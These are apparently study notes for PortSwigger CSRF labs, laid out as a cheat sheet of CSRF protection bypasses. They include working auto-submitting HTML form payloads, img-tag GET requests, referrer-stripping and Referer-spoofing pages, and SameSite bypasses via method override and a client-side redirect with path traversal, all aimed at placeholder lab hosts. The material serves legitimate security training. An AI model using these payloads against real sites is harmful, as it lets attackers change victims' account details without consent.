# Cross-site Request Forgery (CSRF)

## Summary

* [Recon for CSRF](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

<br>

## Resources

* https://portswigger.net/web-security/csrf
* https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery

<br>

## Recon

<br>

### Identify Potential CSRF Vectors

* Identify an application function that can be used to perform some sensitive action on behalf of another user without their knowledge, that relies solely on cookies for tracking user sessions, and that contains request parameters that an attacker can fully determine in advance.

* Some examples of sensitive actions can be changing email address, password, shipping address, transferring funds, etc.

* Create an HTML page that performs the request without user interaction.  
  * For GET requests, we can place the vulnerable URL inside of an \<img\> tag within a src attribute.  
  * For POST requests, we can create a form that contains all the required parameters and issues a request to the vulnerable URL.  JavaScript can then be used to automatically submit the form when the page loads.

* While we have an authenticated session on the application, we can load this HTML page in the same browser to confirm if the request was processed successfully.


<br>

### Example Payload:  CSRF attack with GET request

* We can use the “src” attribute within an \<img\> tag to craft the CSRF exploit, or we can simply just use a stand-alone URL.

```html
<html>
<img src="https://VULNERABLE-APPLICATION.net/my-account/change-email?email=TestCSRF%40Test.com" >
</html>
```

<br>

### Example Payload:  CSRF attack with POST request

* We need to create a form that contains all the required parameters to submit the request successfully.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

<br>

---
---

<br>

## Cheat Sheet

<br>

### No CSRF Protections

* When no CSRF protections are in place in a state-changing request, we can create an appropriate HTML page that will submit a request to the vulnerable application.

    * Payloads for CSRF GET requests can be a self-contained attack within a URL.  An attacker does not need to host the exploit code in their server.  They just need to send the malicious link to the victim user via social engineering techniques.
    
    * Payloads for CSRF POST requests, we need to create a form with all the data needed to process the request successfully.  An attacker needs to host this code somewhere and send a link of that malicious site, to the victim user. The browser will automatically add the Authenticated Session Cookie(s) to the request, when the user clicks on the link.

<br>

### CSRF Protection Bypass - HTTP Method Change

* When the application is using a CSRF Token in a body parameter of a POST request, change the HTTP request method to GET and leave out the CSRF Token parameter.  This can potentially bypass the CSRF defense put in place.  

* This can happen due to frameworks only implementing CSRF protection on state-changing requests, and state-changing requests should only be done with POST method not GET.

<br>

### CSRF Protection Bypass - Remove CSRF Parameter/Value

* When the application uses a CSRF Token as header/parameter, remove the entire CSRF Token parameter and value to potentially bypass this CSRF protection.


<br>

### CSRF Protection Bypass – CSRF Token Not Tied to User Session

* CSRF Tokens may not be tied to the user’s session.  The application may just be keeping a pool of valid tokens and if the submitted request contains one of these tokens, then the request will be processed successfully.  

* An attacker can log into the application, obtain a valid token and use this CSRF token when attacking other users via a CSRF attack.

<br>

### CSRF Protection Bypass – CSRF Token Tied to an Arbitrary Cookie

* The CSRF Token may be tied to an arbitrary Cookie.  If the application contains some functionality that allows us to set a cookie in the victim’s browser, we may be able to bypass this protection.  

* The attacker needs to log into the application, obtain a valid CSRF Token and the Cookie that it is mapped too.  Then create a crafted CSRF exploit that will set the known Cookie in the victim’s browser then submit the POST request with the necessary parameters, which should include the known CSRF Token.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="iH07e8eJkWw" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="$cookie-injection-url" onerror="document.forms[0].submit()">
  </body>
</html>
```

<br>

### CSRF Protection Bypass – Double Submit Cookie Method

* Application was using a double submit cookie for CSRF protection.  There was a CSRF Cookie and a CSRF Token parameter in the state-changing request.  These 2 values contained the exact same data; the application will process the request successfully if those 2 values are equal.

* If the application contains some functionality that allows us to set a cookie in the victim’s browser, we may be able to bypass this protection.  By crafting a payload that will set a cookie in the victim’s browser and supplying the same value as the CSRF Token parameter in the HTML form.


```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="iH07e8eJkWw" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="$cookie-injection-url" onerror="document.forms[0].submit()">
  </body>
</html>
```

<br>

### CSRF Protection Bypass - Referer Header Validation Bypass

* If the application is using the Referer header for protection against CSRF, remove the header/value completely and review if the request was processed successfully.  
* If the request was still successful, we can craft an HTML form that includes some attributes that will cause the browser to drop the “Referer” header with the request.  This will bypass the “protection” in place.


```html
<html>
    <meta name="referrer" content="never">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

<br>

### CSRF Protection Bypass – Referer Header Validation Bypass

* The application was using the Referer header to defend against CSRF attacks.  The application was only checking to see if a specific domain value was somewhere within the “Referer” header.

* This validation can be easily bypassed by submitting a payload that will inject the required domain value as a query parameter in the “Referer” header.   Which will bypass this restriction, as the application is only checking if the value is somewhere in the header.


```html
<html>
    <meta name="referrer" content="unsafe-url">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?REQUIRED-REFERER-VALUE')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```


<br><br>

### SameSite Lax bypass via method override

* If the application is setting the session cookie with the SameSite=Lax configuration, identify all the state changing requests, and determine if the request can be sent with a GET request.

* If the GET requests are blocked, then we can use method override to bypass these restrictions.  Certain frameworks allow this behavior, below is an examlpe using the Symfony framework:

* Example:

   * _method=POST

   * GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1

```javascript
<script>
document.location = "https://0c52008e004f.web-security-academy.net/my-account/change-email?email=test123%40web-security-academy.net&_method=POST";
</script>
```

<br>

### SameSite Strict bypass via client-side redirect

* If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site. 

* One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

* Example:  The application is grabbing the value of the “postId” parameter to initiate a client-side redirect.

  * The directory traversal payload in the beginning was required in order to reach the webroot when the redirection happens.  

  * https://lab.net/post/comment/confirmation?postId=../my-account/change-email?email=test@test.com

```javascript
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

<br>

### SameSite Strict bypass via sibling domain

* https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

* If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. 

* Identify if there are any vulnerabilities in a sibling domain within the same site that enables you to elicit a secondary request, such as an XSS.  Using the XSS vector in the sibling domain allows us to inject the CSRF payload in the request to elicit a same-site request, then the browser will send the session cookies with that CSRF payload request.

* This example in the lab, was using the payload to bypass a Cross-site WebSocket Hijacking (CSWSH) vulnerability as well.  See the WebSocket section for more details on the payloads.


<br>

### SameSite Lax bypass via cookie refresh

* In Chrome, the default configuration for SameSite attribute is setting the cookie with Lax 120 seconds after it has been set by the application.  This only works when the application does not include the SameSite attribute when setting the cookie.

* Since there is a 120 second window where the users are susceptible to cross-site attacks.

* The lab demonstrates an example where we can initiate a request that will set a fresh cookie in the user’s browser, then submit the CSRF payload.  This allows us to submit the CSRF payload always before it reaches the 120 seconds time before the Lax config is set.

* The lab combines a functionality used in the OAuth authentication vulnerability section.  See that section for more details on payloads.

* https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

<br><br>

### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet.
